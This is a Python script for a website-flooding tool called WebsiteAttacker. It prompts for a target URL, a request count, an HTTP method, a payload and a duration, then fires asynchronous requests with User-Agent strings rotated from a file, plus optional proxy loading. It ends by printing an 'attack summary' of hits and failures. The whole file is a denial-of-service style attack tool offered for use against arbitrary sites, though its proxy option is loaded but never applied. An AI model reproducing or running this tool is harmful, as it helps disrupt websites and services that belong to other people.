import asyncio
import aiohttp
import random
import time
import logging
import argparse

# Disable SSL verification warning
import warnings
warnings.simplefilter('ignore', category=UserWarning, module='requests')

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BANNER = """
  _    _ _____                      _ 
 | |  | |  __ \\     /\\        /\\   | |
 | |  | | |__) |   /  \\      /  \\  | |
 | |  | |  _  /   / /\\ \\    / /\\ \\ | |
 | |__| | | \\ \\  / ____ \\  / ____ \\|_|
  \\____/|_|  \\_\\/_/    \\_\\/_/    \\_(_)
                                      
"""

class WebsiteAttacker:
    def __init__(self, url, num_requests, duration, request_method='GET', headers=None, payload=None, proxies=None):
        self.url = url
        self.num_requests = num_requests
        self.duration = duration
        self.request_method = request_method.upper()
        self.headers = headers if headers else {}
        self.payload = payload
        self.proxies = proxies
        self.user_agents = self.load_user_agents()
        self.successful_hits = 0
        self.failed_hits = 0
        self.start_time = time.time()

    def load_user_agents(self):
        """Load user agents from ua.txt."""
        with open("ua.txt", "r") as file:
            return [line.strip() for line in file.readlines()]

    async def hit_website(self, session):
        """Hit the website with a random User-Agent."""
        headers = {"User-Agent": random.choice(self.user_agents)}
        headers.update(self.headers)  # Include additional user-defined headers

        try:
            if self.request_method == 'GET':
                async with session.get(self.url, headers=headers) as response:
                    if response.status == 200:
                        self.successful_hits += 1
                    else:
                        self.failed_hits += 1
            elif self.request_method == 'POST':
                async with session.post(self.url, headers=headers, data=self.payload) as response:
                    if response.status == 200:
                        self.successful_hits += 1
                    else:
                        self.failed_hits += 1

        except Exception as e:
            self.failed_hits += 1

    async def start_attack(self):
        """Start the asynchronous attack."""
        async with aiohttp.ClientSession() as session:
            tasks = []
            end_time = self.start_time + self.duration
            while time.time() < end_time and len(tasks) < self.num_requests:
                tasks.append(self.hit_website(session))
                await asyncio.sleep(random.uniform(0.1, 0.5))  # Throttle requests

            await asyncio.gather(*tasks)  # Wait for all tasks to complete

    def print_summary(self):
        """Print the attack summary."""
        logging.info(BANNER)
        logging.info(f"Method: {self.request_method} | Proxies: {'True' if self.proxies else 'False'}")
        logging.info(f"Hit: {self.successful_hits} | Bad: {self.failed_hits}")

def main():
    print(BANNER)
    url = input("URL (mandatory): ")
    num_requests = int(input("Threads (mandatory): "))
    request_method = input("Method (GET/POST mandatory): ").upper()
    payload = None
    if request_method == 'POST':
        payload = input("Payload (mandatory for POST): ")
    duration = int(input("Time (mandatory): "))
    use_proxies = input("Use Proxies? (Y/N, default N): ").strip().upper()
    
    proxies = None
    if use_proxies == 'Y':
        with open('proxy.txt', 'r') as proxy_file:
            proxies = [line.strip() for line in proxy_file.readlines()]

    attacker = WebsiteAttacker(url, num_requests, duration, request_method, payload=payload, proxies=proxies)
    
    try:
        asyncio.run(attacker.start_attack())
        attacker.print_summary()
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
